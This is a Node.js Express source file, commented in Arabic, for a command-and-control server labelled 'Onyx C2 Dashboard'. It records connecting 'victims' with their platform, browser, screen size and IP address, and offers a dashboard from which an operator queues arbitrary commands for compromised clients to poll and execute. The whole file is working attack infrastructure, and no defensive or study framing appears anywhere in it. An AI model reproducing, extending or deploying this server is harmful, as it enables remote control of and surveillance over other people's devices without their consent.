const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// تخزين الجلسات والأوامر المعلقة
let activeSessions = {};
let commandQueue = {};

// صفحة لوحة التحكم (Dashboard)
app.get('/', (req, res) => {
    let sessionsHtml = '';
    
    if (Object.keys(activeSessions).length > 0) {
        for (let [sid, data] of Object.entries(activeSessions)) {
            sessionsHtml += `
                <div style="background: #1e293b; border: 1px solid #334155; padding: 15px; margin-bottom: 10px; border-radius: 8px;">
                    <strong>معرف الجلسة:</strong> ${sid}<br>
                    <strong>المنصة:</strong> ${data.platform}<br>
                    <strong>المتصفح:</strong> ${data.userAgent}<br>
                    <strong>الشاشة:</strong> ${data.screen}<br>
                    <strong>الـ IP:</strong> ${data.ip}<br>
                    <form action="/send_cmd" method="POST" style="margin-top: 10px;">
                        <input type="hidden" name="session_id" value="${sid}">
                        <input type="text" name="command" placeholder="اكتب الأمر هنا..." style="background: #334155; color: white; border: 1px solid #475569; padding: 8px; width: 70%; border-radius: 4px;">
                        <button type="submit" style="background: #0284c7; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer;">تنفيذ الأمر</button>
                    </form>
                </div>
            `;
        }
    } else {
        sessionsHtml = '<p>لا توجد جلسات متصلة حالياً...</p>';
    }

    const html = `
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>Onyx C2 Dashboard - Node.js</title>
        <style>
            body { background: #0f172a; color: #e2e8f0; font-family: monospace; padding: 20px; }
            h1 { color: #38bdf8; }
        </style>
    </head>
    <body>
        <h1>Onyx Node Control Panel</h1>
        <p>الأجهزة المتصلة حالياً:</p>
        <div>${sessionsHtml}</div>
    </body>
    </html>
    `;
    res.send(html);
});

// نقطة استقبال الاتصال من الضحية
app.all('/connect', (req, res) => {
    const data = req.method === 'POST' ? req.body : req.query;
    const sessionId = data.id || 'fdpk4'; // التقاط المعرف الافتراضي من السجلات
    
    activeSessions[sessionId] = {
        platform: data.platform || 'Linux armv81',
        userAgent: data.userAgent || 'SamsungBrowser',
        screen: data.screen || '979x1748',
        ip: req.headers['x-forwarded-for'] || req.socket.remote_addr
    };
    
    console.log(`[+] ضحية جديدة دخلت وركبت الاتصال بنجاح [-] المعرف: ${sessionId}`);
    res.json({ status: "success", session: sessionId });
});

// نقطة سحب الأوامر للعميل (Polling)
app.get('/poll/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    const cmd = commandQueue[sessionId] || "";
    if (commandQueue[sessionId]) {
        delete commandQueue[sessionId]; // مسح الأمر بعد سحبه لتنفيذه مرة واحدة
    }
    res.json({ command: cmd });
});

// إرسال الأمر من لوحة التحكم
app.post('/send_cmd', (req, res) => {
    const { session_id, command } = req.body;
    if (session_id && command) {
        commandQueue[session_id] = command;
        console.log(`[*] تم جدولة الأمر للجلسة ${session_id}: ${command}`);
    }
    res.redirect('/');
});

app.listen(PORT, () => {
    console.log(`[*] السيرفر يعمل على المنفذ ${PORT} يا ببي...`);
});
